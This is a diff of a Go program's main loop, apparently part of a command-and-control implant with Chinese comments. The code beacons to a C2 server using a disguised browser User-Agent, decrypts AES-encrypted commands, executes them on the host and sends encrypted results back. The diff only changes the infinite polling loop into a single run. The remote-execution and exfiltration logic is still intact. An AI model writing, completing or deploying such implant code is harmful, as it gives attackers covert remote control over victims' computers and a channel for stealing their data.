@@ -48,53 +48,54 @@ func main() {
 	}
 
 	// 5. 主循环：心跳与命令执行
-	for {
-		// 发送心跳
-		reqData := models.FakeAPIRequest{
-			Hostname: hostname,
-			Status:   "idle",
-		}
-		jsonData, _ := json.Marshal(reqData)
-
-		req, _ := http.NewRequest("POST", finalC2URL, bytes.NewBuffer(jsonData))
-		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-		req.Header.Set("Content-Type", "application/json")
-
-		resp, err := client.Do(req)
-		if err != nil {
-			time.Sleep(3 * time.Second)
-			continue
-		}
-
-		body, _ := io.ReadAll(resp.Body)
-		resp.Body.Close()
-
-		// 解析服务器响应
-		var apiResp models.FakeAPIResponse
-		if json.Unmarshal(body, &apiResp) == nil && apiResp.Data != "" {
-			// 解密命令
-			command, err := crypto.Decrypt(apiResp.Data, config.AESKey)
-			if err == nil {
-				// 执行命令
-				result := commands.Execute(command)
-
-				// 加密结果并回传
-				encryptedResult, _ := crypto.Encrypt(result, config.AESKey)
-				resultData := models.FakeAPIRequest{
-					Hostname: hostname,
-					Token:    encryptedResult,
-					Status:   "success",
-				}
-				jsonResult, _ := json.Marshal(resultData)
-
-				postReq, _ := http.NewRequest("POST", finalC2URL, bytes.NewBuffer(jsonResult))
-				postReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-				postReq.Header.Set("Content-Type", "application/json")
-				client.Do(postReq)
-			}
-		}
-
-		// 3 秒后再次心跳
-		time.Sleep(3 * time.Second)
+	//for {
+	// 发送心跳
+	reqData := models.FakeAPIRequest{
+		Hostname: hostname,
+		Status:   "idle",
 	}
+	jsonData, _ := json.Marshal(reqData)
+
+	req, _ := http.NewRequest("POST", finalC2URL, bytes.NewBuffer(jsonData))
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+	req.Header.Set("Content-Type", "application/json")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		//time.Sleep(3 * time.Second)
+		//continue
+		return
+	}
+
+	body, _ := io.ReadAll(resp.Body)
+	resp.Body.Close()
+
+	// 解析服务器响应
+	var apiResp models.FakeAPIResponse
+	if json.Unmarshal(body, &apiResp) == nil && apiResp.Data != "" {
+		// 解密命令
+		command, err := crypto.Decrypt(apiResp.Data, config.AESKey)
+		if err == nil {
+			// 执行命令
+			result := commands.Execute(command)
+
+			// 加密结果并回传
+			encryptedResult, _ := crypto.Encrypt(result, config.AESKey)
+			resultData := models.FakeAPIRequest{
+				Hostname: hostname,
+				Token:    encryptedResult,
+				Status:   "success",
+			}
+			jsonResult, _ := json.Marshal(resultData)
+
+			postReq, _ := http.NewRequest("POST", finalC2URL, bytes.NewBuffer(jsonResult))
+			postReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+			postReq.Header.Set("Content-Type", "application/json")
+			client.Do(postReq)
+		}
+	}
+
+	// 3 秒后再次心跳
+	//	time.Sleep(3 * time.Second)
+	//}
 }
